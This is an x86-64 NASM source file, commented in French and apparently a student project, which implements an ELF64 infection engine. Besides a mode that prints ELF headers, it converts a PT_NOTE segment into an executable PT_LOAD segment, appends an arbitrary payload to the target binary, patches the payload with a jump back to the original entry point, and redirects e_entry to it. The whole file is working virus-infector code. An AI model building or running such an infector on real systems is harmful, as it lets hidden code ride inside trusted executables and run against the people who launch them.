; ============================================================
; elf_parser.asm — Moteur d'infection ELF64 en PUR ASM
;
;   Mode lecture    : ./elf_parser <elf>
;   Mode injection  : ./elf_parser <elf> <payload>
;
; Auteur : Personne A — Projet ELF
; ============================================================

BITS 64

; ====== Syscalls ======
%define SYS_READ        0
%define SYS_WRITE       1
%define SYS_OPEN        2
%define SYS_CLOSE       3
%define SYS_LSEEK       8
%define SYS_EXIT        60

%define O_RDONLY        0
%define O_RDWR          2
%define SEEK_SET        0
%define SEEK_END        2

%define EXIT_OK         0
%define EXIT_ERR        1

%define PHDR_SIZE       56
%define MAX_PHDRS       32
%define PAGE_SIZE       0x1000

; ====== Types ELF ======
%define PT_LOAD         1
%define PT_NOTE         4

; ====== Flags ELF ======
%define PF_RX           5

; ============================================================
section .data
; ============================================================
msg_lecture     db "[+] Mode LECTURE", 10
msg_lecture_len equ 17

msg_injection   db "[+] Mode INJECTION", 10
msg_injection_len equ 19

msg_usage       db "Usage: ./elf_parser <elf> [payload]", 10
msg_usage_len   equ 37

msg_open_err    db "[-] Impossible d'ouvrir le fichier ELF", 10
msg_open_err_len equ 38

msg_open_err_pl db "[-] Impossible d'ouvrir le payload", 10
msg_open_err_pl_len equ 35

msg_read_err    db "[-] Erreur de lecture", 10
msg_read_err_len equ 23

msg_bad_magic   db "[-] Pas un fichier ELF", 10
msg_bad_magic_len equ 24

msg_too_many    db "[-] Trop de program headers", 10
msg_too_many_len equ 27

msg_no_note     db "[-] Aucun PT_NOTE trouvé", 10
msg_no_note_len equ 25

msg_note_found  db "[+] PT_NOTE trouvé à l'index ", 0
msg_note_index  db 10

msg_note_conv   db "[+] PT_NOTE converti en PT_LOAD", 10
msg_note_conv_len equ 31

msg_new_off     db "[+] Nouvel offset = 0x", 0
msg_new_vaddr   db "[+] Nouvelle vaddr = 0x", 0
msg_patch_cnt   db "[+] Placeholder(s) patché(s) : ", 0
msg_entry_old   db "[+] Ancienne e_entry = 0x", 0
msg_entry_new   db "[+] Nouvelle e_entry = 0x", 0

msg_e_entry     db "[+] e_entry = 0x", 0
msg_e_phoff     db "[+] e_phoff = 0x", 0
msg_e_phnum     db "[+] e_phnum = 0x", 0

label_phdr_hdr  db "== Program headers ==", 10, 0
label_bracket   db "  [", 0
label_brk_type  db "] type=0x", 0
label_brk_off   db "  off=0x", 0
label_brk_vaddr db "  vaddr=0x", 0
label_brk_filesz db "  filesz=0x", 0
label_brk_flags db "  flags=0x", 0

msg_newline     db 10

; ============================================================
section .bss
; ============================================================
ehdr            resb 64
phdr_buf        resb PHDR_SIZE * MAX_PHDRS
payload_buf     resb 8192                ; max 8 Ko de payload
hex_buf         resb 16
dec_buf         resb 16

; Variables globales
fd_elf          resq 1
fd_payload      resq 1
fin_fichier     resq 1
new_offset      resq 1
new_vaddr       resq 1
max_off_segment resq 1
max_vaddr_seg   resq 1
ancienne_entry  resq 1
note_idx        resq 1
payload_size    resq 1

; ============================================================
section .text
; ============================================================
global _start

_start:
    mov     r12, [rsp]
    lea     r13, [rsp + 8]

    cmp     r12, 2
    jl      usage_error

    mov     r14, [r13 + 8]              ; r14 = chemin ELF

    cmp     r12, 3
    je      mode_injection

; ============================================================
mode_lecture:
    mov     rax, SYS_WRITE
    mov     edi, 1
    lea     rsi, [msg_lecture]
    mov     edx, msg_lecture_len
    syscall

    ; Ouvre en lecture seule
    mov     rax, SYS_OPEN
    mov     rdi, r14
    xor     esi, esi                    ; O_RDONLY
    xor     edx, edx
    syscall
    test    rax, rax
    js      open_elf_error
    mov     [fd_elf], rax

    ; Lit le header
    call    lire_ehdr

    ; Affiche e_entry, e_phoff, e_phnum
    lea     rdi, [msg_e_entry]
    call    print_cstr
    mov     rdi, [ehdr + 24]
    call    print_hex64
    call    print_newline

    lea     rdi, [msg_e_phoff]
    call    print_cstr
    mov     rdi, [ehdr + 32]
    call    print_hex64
    call    print_newline

    lea     rdi, [msg_e_phnum]
    call    print_cstr
    movzx   rdi, word [ehdr + 56]
    call    print_hex64
    call    print_newline

    ; Affiche les phdrs
    call    afficher_phdrs

    call    close_elf
    jmp     exit_ok

; ============================================================
mode_injection:
    mov     r15, [r13 + 16]             ; r15 = chemin payload
    mov     rax, SYS_WRITE
    mov     edi, 1
    lea     rsi, [msg_injection]
    mov     edx, msg_injection_len
    syscall

    ; Ouvre l'ELF en O_RDWR
    mov     rax, SYS_OPEN
    mov     rdi, r14
    mov     esi, O_RDWR
    xor     edx, edx
    syscall
    test    rax, rax
    js      open_elf_error
    mov     [fd_elf], rax

    ; Lit le header
    call    lire_ehdr

    ; Lit les phdrs en mémoire
    call    lire_phdrs

    ; Affiche les phdrs
    call    afficher_phdrs

    ; ====== CONVERSION PT_NOTE → PT_LOAD ======
    call    convertir_pt_note

    ; ====== CALCUL OFFSETS ======
    call    calculer_offsets

    ; ====== LECTURE PAYLOAD ======
    mov     rdi, r15
    call    lire_payload

    ; ====== PATCH PLACEHOLDER ======
    call    patcher_payload

    ; ====== ÉCRITURE DANS LE FICHIER ======
    call    ecrire_injection

    call    close_elf
    jmp     exit_ok

; ============================================================
; lire_ehdr — lit les 64 octets du header ELF dans `ehdr`
; ============================================================
lire_ehdr:
    mov     rax, SYS_READ
    mov     edi, [fd_elf]
    lea     rsi, [ehdr]
    mov     edx, 64
    syscall
    cmp     rax, 64
    jne     read_error

    ; Vérif magic
    cmp     byte [ehdr], 0x7F
    jne     magic_error
    cmp     byte [ehdr + 1], 'E'
    jne     magic_error
    cmp     byte [ehdr + 2], 'L'
    jne     magic_error
    cmp     byte [ehdr + 3], 'F'
    jne     magic_error

    ; Sauvegarde l'ancienne e_entry
    mov     rax, [ehdr + 24]
    mov     [ancienne_entry], rax
    ret

; ============================================================
; lire_phdrs — lit les phdrs dans phdr_buf
; ============================================================
lire_phdrs:
    movzx   rax, word [ehdr + 56]
    cmp     rax, MAX_PHDRS
    jg      too_many_error

    mov     rax, SYS_LSEEK
    mov     edi, [fd_elf]
    mov     rsi, [ehdr + 32]            ; e_phoff
    xor     edx, edx
    syscall

    movzx   rcx, word [ehdr + 56]
    imul    rcx, PHDR_SIZE

    mov     rax, SYS_READ
    mov     edi, [fd_elf]
    lea     rsi, [phdr_buf]
    mov     edx, ecx
    syscall
    ret

; ============================================================
; afficher_phdrs
; ============================================================
afficher_phdrs:
    push    r13
    push    r14
    push    r15

    lea     rdi, [label_phdr_hdr]
    call    print_cstr

    movzx   r13, word [ehdr + 56]
    xor     r14, r14
    lea     r15, [phdr_buf]

.loop:
    cmp     r14, r13
    jge     .done

    lea     rdi, [label_bracket]
    call    print_cstr
    mov     rdi, r14
    call    print_dec

    lea     rdi, [label_brk_type]
    call    print_cstr
    mov     edi, [r15]
    call    print_hex32

    lea     rdi, [label_brk_off]
    call    print_cstr
    mov     rdi, [r15 + 8]
    call    print_hex64

    lea     rdi, [label_brk_vaddr]
    call    print_cstr
    mov     rdi, [r15 + 16]
    call    print_hex64

    lea     rdi, [label_brk_filesz]
    call    print_cstr
    mov     rdi, [r15 + 32]
    call    print_hex64

    lea     rdi, [label_brk_flags]
    call    print_cstr
    mov     edi, [r15 + 4]
    call    print_hex32

    call    print_newline

    add     r15, PHDR_SIZE
    inc     r14
    jmp     .loop

.done:
    pop     r15
    pop     r14
    pop     r13
    ret

; ============================================================
; convertir_pt_note — trouve un PT_NOTE et le marque comme LOAD
; (les champs définitifs seront remplis après calcul d'offset)
; ============================================================
convertir_pt_note:
    push    r13
    push    r14
    push    r15

    movzx   r13, word [ehdr + 56]
    xor     r14, r14
    lea     r15, [phdr_buf]

.loop:
    cmp     r14, r13
    jge     .not_found

    cmp     dword [r15], PT_NOTE
    je      .found

    add     r15, PHDR_SIZE
    inc     r14
    jmp     .loop

.found:
    mov     [note_idx], r14

    lea     rdi, [msg_note_found]
    call    print_cstr
    mov     rdi, r14
    call    print_dec
    call    print_newline

    ; --- Conversion en mémoire ---
    mov     dword [r15], PT_LOAD
    mov     dword [r15 + 4], PF_RX
    mov     qword [r15 + 48], PAGE_SIZE

    lea     rdi, [msg_note_conv]
    call    print_cstr

    pop     r15
    pop     r14
    pop     r13
    ret

.not_found:
    lea     rdi, [msg_no_note]
    call    print_cstr
    pop     r15
    pop     r14
    pop     r13
    jmp     exit_err

; ============================================================
; calculer_offsets — calcule new_offset et new_vaddr
; ============================================================
calculer_offsets:
    push    rbx
    push    r13
    push    r14
    push    r15

    ; --- 1. Récupérer la fin du fichier ---
    mov     rax, SYS_LSEEK
    mov     edi, [fd_elf]
    xor     esi, esi                    ; offset = 0
    mov     edx, SEEK_END
    syscall
    mov     [fin_fichier], rax

    ; --- 2. Parcourir les phdrs pour trouver max_off_segment et max_vaddr ---
    mov     qword [max_off_segment], 0
    mov     qword [max_vaddr_seg], 0

    movzx   r13, word [ehdr + 56]
    xor     r14, r14
    lea     r15, [phdr_buf]

.loop:
    cmp     r14, r13
    jge     .done_loop

    ; Si c'est un PT_LOAD (type 1)
    cmp     dword [r15], PT_LOAD
    jne     .next

    ; max_off_segment = max(p_offset + p_filesz)
    mov     rax, [r15 + 8]              ; p_offset
    add     rax, [r15 + 32]             ; + p_filesz
    cmp     rax, [max_off_segment]
    jle     .skip_off
    mov     [max_off_segment], rax
.skip_off:

    ; max_vaddr_seg = max(p_vaddr + p_memsz)
    mov     rax, [r15 + 16]             ; p_vaddr
    add     rax, [r15 + 40]             ; + p_memsz
    cmp     rax, [max_vaddr_seg]
    jle     .next
    mov     [max_vaddr_seg], rax

.next:
    add     r15, PHDR_SIZE
    inc     r14
    jmp     .loop

.done_loop:
    ; --- 3. new_offset = (max(fin_fichier, max_off_segment) + 0xFFF) & ~0xFFF + PAGE_SIZE ---
    mov     rax, [fin_fichier]
    mov     rbx, [max_off_segment]
    cmp     rax, rbx
    jge     .use_fin
    mov     rax, rbx
.use_fin:
    ; Aligner sur 0x1000 (arrondi supérieur)
    add     rax, PAGE_SIZE - 1
    and     rax, ~(PAGE_SIZE - 1)
    ; S'assurer qu'on est strictement après max_off_segment
    mov     rbx, [max_off_segment]
    add     rbx, PAGE_SIZE
    cmp     rax, rbx
    jge     .offset_ok
    mov     rax, rbx
    add     rax, PAGE_SIZE - 1
    and     rax, ~(PAGE_SIZE - 1)
.offset_ok:
    mov     [new_offset], rax

    ; --- 4. new_vaddr = (max_vaddr_seg + 0xFFF) & ~0xFFF + PAGE_SIZE ---
    mov     rax, [max_vaddr_seg]
    add     rax, PAGE_SIZE - 1
    and     rax, ~(PAGE_SIZE - 1)
    ; Marge d'une page
    add     rax, PAGE_SIZE
    mov     [new_vaddr], rax

    ; --- Affichage ---
    lea     rdi, [msg_new_off]
    call    print_cstr
    mov     rdi, [new_offset]
    call    print_hex64
    call    print_newline

    lea     rdi, [msg_new_vaddr]
    call    print_cstr
    mov     rdi, [new_vaddr]
    call    print_hex64
    call    print_newline

    pop     r15
    pop     r14
    pop     r13
    pop     rbx
    ret

; ============================================================
; lire_payload(rdi=chemin) — lit le payload dans payload_buf
; ============================================================
lire_payload:
    ; rdi = chemin du payload (reçu en argument)
    ; On l'a passé via rdi lors de l'appel
    push    rdi
    mov     rax, SYS_OPEN
    ; rdi est déjà le chemin
    xor     esi, esi                    ; O_RDONLY
    xor     edx, edx
    syscall
    test    rax, rax
    js      open_payload_error
    mov     [fd_payload], rax

    ; read(fd, payload_buf, 8192)
    mov     rax, SYS_READ
    mov     edi, [fd_payload]
    lea     rsi, [payload_buf]
    mov     edx, 8192
    syscall
    mov     [payload_size], rax

    ; Ferme le payload
    mov     rax, SYS_CLOSE
    mov     edi, [fd_payload]
    syscall

    pop     rdi
    ret

; ============================================================
; patcher_payload — remplace le placeholder par l'offset relatif
; ============================================================
patcher_payload:
    push    rbx
    push    r13
    push    r14
    push    r15

    ; Calcul de l'offset relatif :
    ;   imm32 = ancienne_entry - new_vaddr - offset_pattern + 1
    ;
    ; Pattern : 48 81 c3 41 41 41 41  (7 octets)
    ;
    ; On parcourt payload_buf à la recherche du pattern.

    mov     r15, [payload_size]
    xor     r14, r14                    ; index i
    xor     r13, r13                    ; compteur de patches

.loop:
    lea     rax, [r14 + 7]
    cmp     rax, r15
    jg      .done

    lea     rbx, [payload_buf + r14]

    ; Vérifier le pattern : 48 81 c3 41 41 41 41
    cmp     byte [rbx + 0], 0x48
    jne     .next
    cmp     byte [rbx + 1], 0x81
    jne     .next
    cmp     byte [rbx + 2], 0xC3
    jne     .next
    cmp     byte [rbx + 3], 0x41
    jne     .next
    cmp     byte [rbx + 4], 0x41
    jne     .next
    cmp     byte [rbx + 5], 0x41
    jne     .next
    cmp     byte [rbx + 6], 0x41
    jne     .next

    ; --- Pattern trouvé, calcul de l'offset ---
    ; offset = ancienne_entry - new_vaddr - i + 1
    mov     rax, [ancienne_entry]
    sub     rax, [new_vaddr]
    sub     rax, r14
    inc     rax

    ; Écrire les 4 octets à payload_buf[i+3 .. i+6]
    mov     [rbx + 3], eax

    inc     r13
    add     r14, 7
    jmp     .loop

.next:
    inc     r14
    jmp     .loop

.done:
    ; Afficher le nombre de patches
    lea     rdi, [msg_patch_cnt]
    call    print_cstr
    mov     rdi, r13
    call    print_dec
    call    print_newline

    pop     r15
    pop     r14
    pop     r13
    pop     rbx
    ret

; ============================================================
; ecrire_injection — réécrit les phdrs, e_entry, et le payload
; ============================================================
ecrire_injection:
    push    rbx
    push    r13
    push    r14
    push    r15

    ; --- 1. Mettre à jour le phdr converti avec les nouvelles valeurs ---
    ; index dans note_idx
    mov     r14, [note_idx]
    imul    r14, PHDR_SIZE
    lea     r15, [phdr_buf + r14]

    ; p_offset = new_offset
    mov     rax, [new_offset]
    mov     [r15 + 8], rax

    ; p_vaddr = new_vaddr
    mov     rax, [new_vaddr]
    mov     [r15 + 16], rax

    ; p_paddr = new_vaddr
    mov     [r15 + 24], rax

    ; p_filesz = payload_size
    mov     rax, [payload_size]
    mov     [r15 + 32], rax

    ; p_memsz = payload_size
    mov     [r15 + 40], rax

    ; --- 2. Réécrire les phdrs dans le fichier ---
    mov     rax, SYS_LSEEK
    mov     edi, [fd_elf]
    mov     rsi, [ehdr + 32]            ; e_phoff
    xor     edx, edx
    syscall

    movzx   rcx, word [ehdr + 56]
    imul    rcx, PHDR_SIZE

    mov     rax, SYS_WRITE
    mov     edi, [fd_elf]
    lea     rsi, [phdr_buf]
    mov     edx, ecx
    syscall

    ; --- 3. Mettre à jour e_entry dans ehdr ---
    mov     rax, [new_vaddr]
    mov     [ehdr + 24], rax

    ; --- 4. Réécrire le header au début du fichier ---
    mov     rax, SYS_LSEEK
    mov     edi, [fd_elf]
    xor     esi, esi
    xor     edx, edx
    syscall

    mov     rax, SYS_WRITE
    mov     edi, [fd_elf]
    lea     rsi, [ehdr]
    mov     edx, 64
    syscall

    ; --- 5. Écrire le payload à la fin du fichier ---
    ; D'abord, seek à fin_fichier pour le padding
    mov     rax, SYS_LSEEK
    mov     edi, [fd_elf]
    mov     rsi, [fin_fichier]
    xor     edx, edx
    syscall

    ; Padding NOP : de fin_fichier à new_offset
    ; Pour simplifier, on écrit un seul gros bloc de NOP
    ; (on va écrire des NOP un par un via un petit buffer)
    mov     rbx, [new_offset]
    sub     rbx, [fin_fichier]          ; nombre de NOP à écrire

    ; Alloue un buffer de NOP sur la pile ? Non, utilisons un loop
    ; Mais faire un write par octet est lent... On va utiliser
    ; un buffer de 64 NOP répété.
    cmp     rbx, 0
    jle     .skip_padding

    ; On écrit les NOP par paquets de 64
.pad_loop:
    cmp     rbx, 0
    jle     .skip_padding
    mov     rdx, 64
    cmp     rbx, 64
    jge     .write_pad
    mov     rdx, rbx
.write_pad:
    ; Écrire un buffer de 64 NOP (on utilise une zone temporaire)
    ; Pour faire simple : on écrit depuis une chaîne statique
    mov     rax, SYS_WRITE
    mov     edi, [fd_elf]
    lea     rsi, [nop_64]
    ; rdx = min(64, rbx)
    syscall
    sub     rbx, 64
    jmp     .pad_loop

.skip_padding:
    ; --- 6. Seek à new_offset ---
    mov     rax, SYS_LSEEK
    mov     edi, [fd_elf]
    mov     rsi, [new_offset]
    xor     edx, edx
    syscall

    ; --- 7. Écrire le payload ---
    mov     rax, SYS_WRITE
    mov     edi, [fd_elf]
    lea     rsi, [payload_buf]
    mov     rdx, [payload_size]
    syscall

    ; --- 8. Affichage final ---
    lea     rdi, [msg_entry_old]
    call    print_cstr
    mov     rdi, [ancienne_entry]
    call    print_hex64
    call    print_newline

    lea     rdi, [msg_entry_new]
    call    print_cstr
    mov     rdi, [new_vaddr]
    call    print_hex64
    call    print_newline

    pop     r15
    pop     r14
    pop     r13
    pop     rbx
    ret

; ============================================================
; close_elf
; ============================================================
close_elf:
    mov     rax, SYS_CLOSE
    mov     edi, [fd_elf]
    syscall
    ret

; ============================================================
; Fonctions d'affichage
; ============================================================
print_cstr:
    mov     rsi, rdi
    xor     ecx, ecx
.len_loop:
    cmp     byte [rsi + rcx], 0
    je      .len_done
    inc     rcx
    jmp     .len_loop
.len_done:
    mov     rax, SYS_WRITE
    mov     edi, 1
    mov     edx, ecx
    syscall
    ret

print_hex64:
    mov     rbx, rdi
    lea     rsi, [hex_buf]
    mov     ecx, 16
.loop:
    rol     rbx, 4
    mov     rax, rbx
    and     eax, 0x0F
    cmp     eax, 10
    jl      .digit
    add     eax, 'a' - 10
    jmp     .store
.digit:
    add     eax, '0'
.store:
    mov     [rsi], al
    inc     rsi
    dec     ecx
    jnz     .loop

    mov     rax, SYS_WRITE
    mov     edi, 1
    lea     rsi, [hex_buf]
    mov     edx, 16
    syscall
    ret

print_hex32:
    mov     ebx, edi
    lea     rsi, [hex_buf]
    mov     ecx, 8
.loop:
    rol     ebx, 4
    mov     eax, ebx
    and     eax, 0x0F
    cmp     eax, 10
    jl      .digit
    add     eax, 'a' - 10
    jmp     .store
.digit:
    add     eax, '0'
.store:
    mov     [rsi], al
    inc     rsi
    dec     ecx
    jnz     .loop

    mov     rax, SYS_WRITE
    mov     edi, 1
    lea     rsi, [hex_buf]
    mov     edx, 8
    syscall
    ret

print_dec:
    mov     rax, rdi
    lea     rsi, [dec_buf + 15]
    mov     byte [rsi], 0
    dec     rsi
    mov     ecx, 10
.div_loop:
    xor     edx, edx
    div     ecx
    add     dl, '0'
    mov     [rsi], dl
    dec     rsi
    test    rax, rax
    jnz     .div_loop
    inc     rsi
    lea     rdx, [dec_buf + 15]
    sub     rdx, rsi
    mov     rax, SYS_WRITE
    mov     edi, 1
    syscall
    ret

print_newline:
    mov     rax, SYS_WRITE
    mov     edi, 1
    lea     rsi, [msg_newline]
    mov     edx, 1
    syscall
    ret

; ============================================================
section .data
; ============================================================
nop_64          times 64 db 0x90

; ============================================================
section .text
; ============================================================
; Erreurs
; ============================================================
open_elf_error:
    mov     rax, SYS_WRITE
    mov     edi, 2
    lea     rsi, [msg_open_err]
    mov     edx, msg_open_err_len
    syscall
    jmp     exit_err

open_payload_error:
    mov     rax, SYS_WRITE
    mov     edi, 2
    lea     rsi, [msg_open_err_pl]
    mov     edx, msg_open_err_pl_len
    syscall
    jmp     exit_err

read_error:
    mov     rax, SYS_WRITE
    mov     edi, 2
    lea     rsi, [msg_read_err]
    mov     edx, msg_read_err_len
    syscall
    jmp     exit_err

magic_error:
    mov     rax, SYS_WRITE
    mov     edi, 2
    lea     rsi, [msg_bad_magic]
    mov     edx, msg_bad_magic_len
    syscall
    jmp     exit_err

too_many_error:
    mov     rax, SYS_WRITE
    mov     edi, 2
    lea     rsi, [msg_too_many]
    mov     edx, msg_too_many_len
    syscall
    jmp     exit_err

usage_error:
    mov     rax, SYS_WRITE
    mov     edi, 2
    lea     rsi, [msg_usage]
    mov     edx, msg_usage_len
    syscall
    jmp     exit_err

exit_ok:
    mov     rax, SYS_EXIT
    xor     edi, edi
    syscall

exit_err:
    mov     rax, SYS_EXIT
    mov     edi, EXIT_ERR
    syscall
